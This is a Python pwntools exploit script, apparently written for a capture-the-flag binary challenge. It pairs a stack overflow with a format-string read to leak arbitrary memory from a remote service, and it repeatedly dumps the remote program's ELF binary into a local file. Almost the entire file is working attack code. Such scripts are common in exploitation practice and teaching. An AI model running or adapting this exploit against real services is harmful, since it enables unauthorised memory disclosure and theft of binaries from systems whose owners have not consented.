#!/usr/bin/env python
import sys, os
from pwn import *

log.warning('Usage: ./exp.py [HOST] [PORT]')
#prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
#elf = ELF(prog)
#if not elf: log.warning('Cannot open ' + prog)
#libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
#if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
#context.word_size = 64 if '64' in elf.arch else 32 # amd64, aarch64, powerpc64, mips64

def leak_addr(addr, ref=False):
    r.sendline('a'*0x28 + p64(addr))
    r.recvuntil('somewhere.\n')
    r.sendline('%13$p') if ref else r.sendline('%13$s')
    r.recvuntil('somewhere.\n')
    leak = r.recv()[:-1]
    #log.info('{} -> {}'.format(hex(addr), hex(leak)))
    #log.info('{} -> {}'.format(hex(addr), leak.encode('hex')))
    return leak

def leak_elf(base=0x400000):
    global r
    progress = log.progress('base')
    while True:
        r = remote(HOST, PORT)
        buf = ''
        try:
            while True:
                if base & 0xff == 0xa or base & 0xff == 0x6e:
                    buf += '\x00'
                    base += 1
                progress.status(hex(base))
                leak = leak_addr(base)
                if len(leak) == 0:
                    buf += '\x00'
                    base += 1
                else:
                    buf += leak
                    base += len(leak)
        except:
            log.warning('timeout, write to file ...')
            if len(sys.argv) > 4:
                f = sys.argv[4]
            else:
                f = './elf'
            open(f, 'ab').write(buf)


def leak(buf):
    r.sendline(buf)
    r.recvuntil('somewhere.\n')
    return r.recvline()


r = None
leak_elf(int(sys.argv[3], 16))

#r.interactive()
